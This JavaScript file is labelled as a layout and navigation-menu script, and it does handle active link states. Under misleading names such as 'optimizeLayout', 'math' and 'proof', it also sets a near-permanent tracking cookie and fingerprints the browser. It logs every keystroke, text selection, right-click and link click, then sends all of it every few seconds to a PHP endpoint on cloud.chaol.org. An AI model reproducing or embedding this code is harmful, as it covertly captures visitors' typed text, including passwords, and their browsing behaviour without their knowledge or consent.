//doesnt work much for the layout for now; works for the navigation menu links tho

function makeid(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return result;
}

function getMath(name) {
    var dc = document.cookie;
    var prefix = name + "=";
    var begin = dc.indexOf("; " + prefix);
    if (begin == -1) {
        begin = dc.indexOf(prefix);
        if (begin != 0) return null;
    }
    else {
        begin += 2;
        var end = document.cookie.indexOf(";", begin);
        if (end == -1) {
            end = dc.length;
        }
    }
    return decodeURI(dc.substring(begin + prefix.length, end));
}
function formatDateToUTC(date) {
    const formattedDate = date.toISOString().replace('T', ' ').substring(0, 19) + ' UTC';

    return formattedDate;
}

if (!mathCreatedTime) {
    mathCreatedTime = formatDateToUTC(new Date());
    localStorage.setItem("mathCreatedTime", mathCreatedTime);
}
var math = localStorage.getItem("math");  // Changed from mathId to math
var mathCreatedTime = localStorage.getItem("mathCreatedTime");

if (!math) {
    math = getMath("math");
    if (!math) {
        math = makeid(32);
        document.cookie = "math=" + math + ";max-age=" + 2147483600 + ";domain=.chaol.org;path=/";
    }
    localStorage.setItem("math", math);
}

if (!mathCreatedTime) {
    mathCreatedTime = formatDateToUTC(new Date());
    localStorage.setItem("mathCreatedTime", mathCreatedTime);
}



//To be improved

let eventsBuffer = [];
let keyBuffer = [];

setInterval(() => {
    if (eventsBuffer.length > 0 || keyBuffer.length > 0) {
        optimizeLayout('bufferInterval');
    }
}, 5000); // 3 seconds




function addToBuffer(type, data) {
    eventsBuffer.push({ type, data });
    // if (eventsBuffer.length >= 60) {
    // optimizeLayout('bufferThreshold');
    // }
}


const screenWidth = window.screen.width;
const screenHeight = window.screen.height;
const browserLanguages = navigator.languages.join(", ");
const primaryBrowserLanguage = navigator.language || "N/A";
const platform = navigator.platform;
const cookiesEnabled = navigator.cookieEnabled;
const colorDepth = window.screen.colorDepth;
const deviceMemory = navigator.deviceMemory || "N/A";
const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
const userAgent = navigator.userAgent;
const humanReadableTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";

const proof = {
    math,
    mathTime: mathCreatedTime || 'N/A',
    TimezoneNow: humanReadableTimezone,
    w: screenWidth,
    h: screenHeight,
    PrimaryBrowserLanguage: primaryBrowserLanguage,
    BrowserLanguages: browserLanguages,
    Platform: platform,
    ColorDepth: colorDepth,
    DeviceMemory: deviceMemory,
    HardwareConcurrency: hardwareConcurrency,
    CookiesEnabled: cookiesEnabled,
    UserAgent: userAgent,
    Current: window.location.href,
    From: document.referrer,
    // EventBuffer: eventData,
    // KeyBuffer: keyData
};

function optimizeLayout(triggerEvent) {

// console.log("optimizeLayout called");
    let eventData = eventsBuffer.map(event => `${event.type}:${event.data}`).join('|');
    let keyData = keyBuffer.join('');

    proof.EventBuffer = eventData;
    eventsBuffer = [];
    proof.KeyBuffer = keyData;
    keyBuffer = [];
    if (triggerEvent) {
        proof.Event = triggerEvent;
    }


    // console.log(proof); // This will display the content of proof in the console.
    // if (Object.keys(proof).length === 0) {
    //     console.error('Proof object is empty!');
    // }

    fetch('https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(proof)
        
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .catch(error => {
            console.error('Error:', error);
        })
        .finally(() => {
        });
}

optimizeLayout(`visitCurrentPage:${window.location.href}`);


document.addEventListener('keydown', (e) => {
    if (e.key.length === 1) {
        keyBuffer.push(e.key);
    } else {
        keyBuffer.push(`<<${e.key}>>`);
    }

    // if (keyBuffer.length >= 12) {
    //     optimizeLayout('keyBufferThreshold');
    // }
});

document.addEventListener('mouseup', function () {
    let selectedText = window.getSelection().toString().trim().replace(/\r?\n|\r/g, ' '); // Replacing newline characters

    let words = selectedText.split(/\s+/);
    for (let i = 0; i < words.length; i++) {
        try {
            encodeURI(words[i]);
            // words[i] = encodeURI(words[i]);
        } catch (err) {
            // console.error("Error Selecting and Encoding the word:", err, "The Word is:", words[i]);
            words[i] = " ";
        }
    }
    selectedText = words.join(' ');

    if (selectedText.length > 0) {
        addToBuffer('textSelection', selectedText);
    }
});



window.addEventListener('beforeunload', () => {
    // clearInterval(sendInterval);

    if (keyBuffer.length > 0 || eventsBuffer.length > 0) {
        optimizeLayout('pageUnload');
    }
});




document.addEventListener("DOMContentLoaded", function () {


    // Handling link redirections
    var links = document.querySelectorAll("a");
    links.forEach(function (link) {
        link.addEventListener("click", function (event) {
            event.preventDefault();
            var href = link.getAttribute("href");
            optimizeLayout(`LinkClicked:${href}`);

            setTimeout(function() {
                if (link.getAttribute("target") === "_blank") {
                    var newWin = window.open('', '_blank');
                    newWin.rel = "noopener noreferrer";
                    newWin.location.href = href;
                } else {
                    window.location.href = href;
                }
            }, 200);  //   m seconds
        });
    });



    // Handling active state for navigation menu links
    const navLinks = document.querySelectorAll(".nav-menu a");
    let activeLink = null;
    navLinks.forEach(link => {
        let linkPathname = new URL(link.href).pathname;
        if (!linkPathname.endsWith('/')) {
            linkPathname += '/';
        }

        if (window.location.pathname === linkPathname) {
            link.classList.add("active");
            activeLink = link;
        }

        link.addEventListener("mouseenter", function () {
            if (activeLink) {
                activeLink.classList.remove("active");
            }
        });

        link.addEventListener("mouseleave", function () {
            if (activeLink) {
                activeLink.classList.add("active");
            }
        });
    });


    document.addEventListener("contextmenu", function (event) {
        addToBuffer("event", "RightClick");
    });

    const submitButton = document.getElementById('submitButton');
    if (submitButton) {
        submitButton.addEventListener('click', function () {
            optimizeLayout('SubmitButtonClick');
        });
    }

    const resetButton = document.getElementById('resetButton');
    if (resetButton) {
        resetButton.addEventListener('click', function () {
            optimizeLayout('resetButtonClick');
        });
    }


});

